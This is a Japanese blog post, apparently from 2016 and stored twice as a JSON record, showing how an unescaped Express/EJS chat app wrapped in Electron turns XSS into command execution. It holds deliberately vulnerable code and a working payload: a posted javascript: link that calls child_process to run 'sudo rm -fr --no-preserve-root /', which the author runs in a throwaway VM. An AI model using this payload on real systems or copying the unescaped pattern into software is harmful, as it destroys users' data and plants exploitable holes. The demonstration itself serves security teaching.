{"tags": ["Node.js", "Electron", "JavaScript", "xss"], "context": "Electron\u30a2\u30d7\u30ea\u3067xss\u3092\u767a\u751f\u3055\u305b\u308b\u3068\u4efb\u610f\u306e\u30b3\u30fc\u30c9\u304c\u5b9f\u884c\u3067\u304d\u308b\u3089\u3057\u3044\u306e\u3067rm -fr /\u3092\u8a66\u3057\u3066\u307f\u307e\u3059\u3002\n\n\u60f3\u5b9a\nweb\u7248\u3068electron\u7248\u306e\u3042\u308b\u30c1\u30e3\u30c3\u30c8\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3068\u3044\u3046\u8a2d\u5b9a\u3067\u3059\u3002\u653b\u6483\u8005\u304c\u7528\u610f\u3057\u305f\u30ea\u30f3\u30af\u3092\u30af\u30ea\u30c3\u30af\u3059\u308b\u3068\u3001PC\u5185\u306e\u3059\u3079\u3066\u306e\u30d5\u30a1\u30a4\u30eb\u3092\u6d88\u3057\u53bb\u308b\u3068\u3044\u3046\u30b7\u30c1\u30e5\u30a8\u30fc\u30b7\u30e7\u30f3\u3092\u8003\u3048\u3066\u307f\u307e\u3059\u3002\n\n\u7528\u610f\n\u74b0\u5883\u306f\u30db\u30b9\u30c8mac OSX\u3001\u30b2\u30b9\u30c8\u306bubuntu14.04\u74b0\u5883\u3092vagrant\u3092\u5229\u7528\u3057\u7528\u610f\u3057\u307e\u3057\u305f\u3002\nexpress\u3067\u30ea\u30b9\u30c8\u3068\u30d5\u30a9\u30fc\u30e0\u304b\u3089\u306a\u308b\u8106\u5f31\u6027\u306e\u3042\u308b\u30c1\u30e3\u30c3\u30c8\u3092\u3064\u304f\u308a\u307e\u3059\u3002\u30a8\u30b9\u30b1\u30fc\u30d7\u51e6\u7406\u3092\u3057\u3066\u306a\u3044\u306e\u3067\u3001\u4efb\u610f\u306e\u30b3\u30fc\u30c9\u304c\u5b9f\u884c\u3067\u304d\u308b\u72b6\u6cc1\u3067\u3059\u3002\n\nserver.js\n'use strict';\nconst path = require('path');\nconst express = require('express');\nconst app = express();\nconst ejs = require('ejs');\n\napp.engine('ejs', ejs.renderFile);\napp.set('views', path.join(__dirname, 'views'));\n\nconst messages = ['hello', 'world'];\n\napp.get('/', (req, res) => {\n    res.render('index.ejs', {\n        messages\n    });\n});\n\napp.get('/post', (req, res) => {\n    const {message} = req.query;\n    if (message) {\n        messages.push(message);\n    }\n    res.redirect('/');\n});\n\napp.listen(3000, () => {\n    console.log('Example app listening on port 3000!');\n});\n\n\n<%= %>\u3067\u306f\u306a\u304f<%- %>\u3092\u4f7f\u3046\u3053\u3068\u3067\u30a8\u30b9\u30b1\u30fc\u30d7\u51e6\u7406\u3092\u884c\u308f\u306a\u3044\u3088\u3046\u306b\u3057\u3066\u307e\u3059\u3002\n\nindex.ejs\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS</title>\n</head>\n<body>\n    <form method=\"get\" action=\"/post\">\n        <textarea name=\"message\" cols=\"50\" rows=\"7\"></textarea>\n        <input type=\"submit\" />\n    </form>\n    <ul class=\"message--list\">\n        <% for(let msg of messages) { %>\n            <li><%- msg %></li>\n        <% } %>\n    </ul>\n</body>\n</html>\n\n\n\u3055\u3066\u3001\u975e\u5e38\u306b\u7c21\u6613\u7684\u3067\u3059\u304c\u3001\u4e0a\u8a18\u306e\u30b3\u30fc\u30c9\u3092Electron\u306b\u7d44\u307f\u8fbc\u307f\u307e\u3059\u3002\n\nindex.js\n'use strict';\nconst electron = require('electron');\nrequire('./server');\nconst {app} = electron;\n\nlet mainWindow;\n\nfunction onClosed() {\n    mainWindow = null;\n}\n\nfunction createMainWindow() {\n    const win = new electron.BrowserWindow({\n        width: 600,\n        height: 400\n    });\n\n    win.loadURL(`http://127.0.0.1:3000`);\n    win.on('closed', onClosed);\n\n    return win;\n}\n\napp.on('window-all-closed', () => {\n    if (process.platform !== 'darwin') {\n        app.quit();\n    }\n});\n\napp.on('activate', () => {\n    if (!mainWindow) {\n        mainWindow = createMainWindow();\n    }\n});\n\napp.on('ready', () => {\n    mainWindow = createMainWindow();\n});\n\n\n\u30d5\u30a9\u30fc\u30e0\u3068\u30ea\u30b9\u30c8\u304b\u3089\u306a\u308b\u7c21\u6613\u7684\u306a\u30c1\u30e3\u30c3\u30c8\u30a2\u30d7\u30ea\u304c\u3067\u304d\u307e\u3057\u305f\u3002\n\n\n\u5b9f\u884c\nubutnu14.04\u306e\u4eee\u60f3\u74b0\u5883\u3092\u7528\u610f\u3057\u3066rm -fr /\u304c\u5b9f\u884c\u3055\u308c\u308b\u306e\u304b\u8a66\u3057\u3066\u307f\u307e\u3059\u3002\n\u30d5\u30a9\u30fc\u30e0\u306b\u4ee5\u4e0b\u306e\u5185\u5bb9\u3067\u6295\u7a3f\u3057\u3066\u307f\u307e\u3059\u3002\n<a href=\"javascript:\n(() => {\n    const {execSync} = require('child_process');\n    execSync('sudo rm -fr --no-preserve-root /', {encoding: 'utf8'});\n})();\n\">CLICK ME</a>\n\nchild_process\u3092\u4f7f\u3048\u3070\u4efb\u610f\u306e\u30b3\u30de\u30f3\u30c9\u304c\u5b9f\u884c\u3067\u304d\u308b\u306e\u3067\u3001rm -fr\u3092\u5b9f\u884c\u3055\u305b\u307e\u3059\u3002\u3053\u308c\u3067\u3001\u30ea\u30f3\u30af\u3092\u30af\u30ea\u30c3\u30af\u3059\u308b\u3068PC\u304c\u6b7b\u306b\u307e\u3059\u3002\u3055\u3088\u306a\u3089\uff01\n\n\u6b7b\u306b\u307e\u3057\u305f\u3002\n\n\u30ef\u30f3\u30af\u30ea\u30c3\u30af\u3067\u3059\u3079\u3066\u304c\u5439\u304d\u98db\u3076\u306e\u6700\u9ad8\u3067\u3059\u306d\u3002gif\u3092\u64ae\u308a\u5fd8\u308c\u305f\u306e\u304c\u5fc3\u6b8b\u308a\u3067\u3059\u3002\n\n\u53c2\u8003\n\u4ee5\u4e0b\u306e\u30ea\u30f3\u30af\u304cElectron\u306b\u304a\u3051\u308b\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56\u306b\u3064\u3044\u3066\u8a73\u3057\u304f\u307e\u3068\u307e\u3063\u3066\u3044\u307e\u3059\u3002\nelectron\u306e\u5012\u3057\u65b9\n\n\u307e\u3068\u3081\nElectron\u30a2\u30d7\u30ea\u306b\u8106\u5f31\u6027\u304c\u3042\u308b\u3068web\u306b\u304a\u3051\u308b\u88ab\u5bb3\u3088\u308a\u3001\u30af\u30ea\u30c6\u30a3\u30ab\u30eb\u306a\u88ab\u5bb3\u304c\u3067\u308b\u3053\u3068\u304c\u78ba\u8a8d\u3067\u304d\u307e\u3057\u305f\u3002\n\u4e00\u5fdcgithub\u306b\u4eca\u56de\u8a66\u3057\u305f\u8106\u5f31\u6027\u30a2\u30d7\u30ea\u3092\u7f6e\u3044\u3066\u304a\u3044\u305f\u306e\u3067\u3001\u8a66\u3057\u305f\u3044\u4eba\u306f\u3069\u3046\u305e\u3002\n\nakameco/try-xss-electron\n\nElectron\u30a2\u30d7\u30ea\u3067xss\u3092\u767a\u751f\u3055\u305b\u308b\u3068\u4efb\u610f\u306e\u30b3\u30fc\u30c9\u304c\u5b9f\u884c\u3067\u304d\u308b\u3089\u3057\u3044\u306e\u3067`rm -fr /`\u3092\u8a66\u3057\u3066\u307f\u307e\u3059\u3002\n\n## \u60f3\u5b9a\nweb\u7248\u3068electron\u7248\u306e\u3042\u308b\u30c1\u30e3\u30c3\u30c8\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3068\u3044\u3046\u8a2d\u5b9a\u3067\u3059\u3002\u653b\u6483\u8005\u304c\u7528\u610f\u3057\u305f\u30ea\u30f3\u30af\u3092\u30af\u30ea\u30c3\u30af\u3059\u308b\u3068\u3001PC\u5185\u306e\u3059\u3079\u3066\u306e\u30d5\u30a1\u30a4\u30eb\u3092\u6d88\u3057\u53bb\u308b\u3068\u3044\u3046\u30b7\u30c1\u30e5\u30a8\u30fc\u30b7\u30e7\u30f3\u3092\u8003\u3048\u3066\u307f\u307e\u3059\u3002\n\n## \u7528\u610f\n\u74b0\u5883\u306f\u30db\u30b9\u30c8mac OSX\u3001\u30b2\u30b9\u30c8\u306bubuntu14.04\u74b0\u5883\u3092vagrant\u3092\u5229\u7528\u3057\u7528\u610f\u3057\u307e\u3057\u305f\u3002\n\nexpress\u3067\u30ea\u30b9\u30c8\u3068\u30d5\u30a9\u30fc\u30e0\u304b\u3089\u306a\u308b\u8106\u5f31\u6027\u306e\u3042\u308b\u30c1\u30e3\u30c3\u30c8\u3092\u3064\u304f\u308a\u307e\u3059\u3002\u30a8\u30b9\u30b1\u30fc\u30d7\u51e6\u7406\u3092\u3057\u3066\u306a\u3044\u306e\u3067\u3001\u4efb\u610f\u306e\u30b3\u30fc\u30c9\u304c\u5b9f\u884c\u3067\u304d\u308b\u72b6\u6cc1\u3067\u3059\u3002\n\n```server.js\n'use strict';\nconst path = require('path');\nconst express = require('express');\nconst app = express();\nconst ejs = require('ejs');\n\napp.engine('ejs', ejs.renderFile);\napp.set('views', path.join(__dirname, 'views'));\n\nconst messages = ['hello', 'world'];\n\napp.get('/', (req, res) => {\n\tres.render('index.ejs', {\n\t\tmessages\n\t});\n});\n\napp.get('/post', (req, res) => {\n\tconst {message} = req.query;\n\tif (message) {\n\t\tmessages.push(message);\n\t}\n\tres.redirect('/');\n});\n\napp.listen(3000, () => {\n\tconsole.log('Example app listening on port 3000!');\n});\n```\n\n`<%= %>`\u3067\u306f\u306a\u304f`<%- %>`\u3092\u4f7f\u3046\u3053\u3068\u3067\u30a8\u30b9\u30b1\u30fc\u30d7\u51e6\u7406\u3092\u884c\u308f\u306a\u3044\u3088\u3046\u306b\u3057\u3066\u307e\u3059\u3002\n\n```html:index.ejs\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>XSS</title>\n</head>\n<body>\n\t<form method=\"get\" action=\"/post\">\n\t\t<textarea name=\"message\" cols=\"50\" rows=\"7\"></textarea>\n\t\t<input type=\"submit\" />\n\t</form>\n\t<ul class=\"message--list\">\n\t\t<% for(let msg of messages) { %>\n\t\t\t<li><%- msg %></li>\n\t\t<% } %>\n\t</ul>\n</body>\n</html>\n```\n\n\u3055\u3066\u3001\u975e\u5e38\u306b\u7c21\u6613\u7684\u3067\u3059\u304c\u3001\u4e0a\u8a18\u306e\u30b3\u30fc\u30c9\u3092Electron\u306b\u7d44\u307f\u8fbc\u307f\u307e\u3059\u3002\n\n```index.js\n'use strict';\nconst electron = require('electron');\nrequire('./server');\nconst {app} = electron;\n\nlet mainWindow;\n\nfunction onClosed() {\n\tmainWindow = null;\n}\n\nfunction createMainWindow() {\n\tconst win = new electron.BrowserWindow({\n\t\twidth: 600,\n\t\theight: 400\n\t});\n\n\twin.loadURL(`http://127.0.0.1:3000`);\n\twin.on('closed', onClosed);\n\n\treturn win;\n}\n\napp.on('window-all-closed', () => {\n\tif (process.platform !== 'darwin') {\n\t\tapp.quit();\n\t}\n});\n\napp.on('activate', () => {\n\tif (!mainWindow) {\n\t\tmainWindow = createMainWindow();\n\t}\n});\n\napp.on('ready', () => {\n\tmainWindow = createMainWindow();\n});\n```\n\n\u30d5\u30a9\u30fc\u30e0\u3068\u30ea\u30b9\u30c8\u304b\u3089\u306a\u308b\u7c21\u6613\u7684\u306a\u30c1\u30e3\u30c3\u30c8\u30a2\u30d7\u30ea\u304c\u3067\u304d\u307e\u3057\u305f\u3002\n\n![\u30b9\u30af\u30ea\u30fc\u30f3\u30b7\u30e7\u30c3\u30c8 2016-05-21 09.28.42.png](https://qiita-image-store.s3.amazonaws.com/0/15319/fc14db3a-7802-322a-a15a-b25a79a85cf7.png)\n\n\n## \u5b9f\u884c\nubutnu14.04\u306e\u4eee\u60f3\u74b0\u5883\u3092\u7528\u610f\u3057\u3066`rm -fr /`\u304c\u5b9f\u884c\u3055\u308c\u308b\u306e\u304b\u8a66\u3057\u3066\u307f\u307e\u3059\u3002\n\u30d5\u30a9\u30fc\u30e0\u306b\u4ee5\u4e0b\u306e\u5185\u5bb9\u3067\u6295\u7a3f\u3057\u3066\u307f\u307e\u3059\u3002\n\n```js\n<a href=\"javascript:\n(() => {\n\tconst {execSync} = require('child_process');\n\texecSync('sudo rm -fr --no-preserve-root /', {encoding: 'utf8'});\n})();\n\">CLICK ME</a>\n```\n\n`child_process`\u3092\u4f7f\u3048\u3070\u4efb\u610f\u306e\u30b3\u30de\u30f3\u30c9\u304c\u5b9f\u884c\u3067\u304d\u308b\u306e\u3067\u3001`rm -fr`\u3092\u5b9f\u884c\u3055\u305b\u307e\u3059\u3002\u3053\u308c\u3067\u3001\u30ea\u30f3\u30af\u3092\u30af\u30ea\u30c3\u30af\u3059\u308b\u3068PC\u304c\u6b7b\u306b\u307e\u3059\u3002\u3055\u3088\u306a\u3089\uff01\n\n![\u30b9\u30af\u30ea\u30fc\u30f3\u30b7\u30e7\u30c3\u30c8 2016-05-21 09.57.30.png](https://qiita-image-store.s3.amazonaws.com/0/15319/97fb426f-b64b-1f59-bc88-3251d1bd1c6b.png)\n\n\u6b7b\u306b\u307e\u3057\u305f\u3002\n\n![\u30b9\u30af\u30ea\u30fc\u30f3\u30b7\u30e7\u30c3\u30c8 2016-05-21 19.14.49.png](https://qiita-image-store.s3.amazonaws.com/0/15319/60e3c623-8ed2-c471-e56d-419716f1d817.png)\n\n\u30ef\u30f3\u30af\u30ea\u30c3\u30af\u3067\u3059\u3079\u3066\u304c\u5439\u304d\u98db\u3076\u306e\u6700\u9ad8\u3067\u3059\u306d\u3002gif\u3092\u64ae\u308a\u5fd8\u308c\u305f\u306e\u304c\u5fc3\u6b8b\u308a\u3067\u3059\u3002\n\n## \u53c2\u8003\n\u4ee5\u4e0b\u306e\u30ea\u30f3\u30af\u304cElectron\u306b\u304a\u3051\u308b\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56\u306b\u3064\u3044\u3066\u8a73\u3057\u304f\u307e\u3068\u307e\u3063\u3066\u3044\u307e\u3059\u3002\n\n[electron\u306e\u5012\u3057\u65b9](http://utf-8.jp/public/2016/0307/electron.pdf)\n\n## \u307e\u3068\u3081\nElectron\u30a2\u30d7\u30ea\u306b\u8106\u5f31\u6027\u304c\u3042\u308b\u3068web\u306b\u304a\u3051\u308b\u88ab\u5bb3\u3088\u308a\u3001\u30af\u30ea\u30c6\u30a3\u30ab\u30eb\u306a\u88ab\u5bb3\u304c\u3067\u308b\u3053\u3068\u304c\u78ba\u8a8d\u3067\u304d\u307e\u3057\u305f\u3002\n\n\u4e00\u5fdcgithub\u306b\u4eca\u56de\u8a66\u3057\u305f\u8106\u5f31\u6027\u30a2\u30d7\u30ea\u3092\u7f6e\u3044\u3066\u304a\u3044\u305f\u306e\u3067\u3001\u8a66\u3057\u305f\u3044\u4eba\u306f\u3069\u3046\u305e\u3002\n\n- [akameco/try-xss-electron](https://github.com/akameco/try-xss-electron)\n"}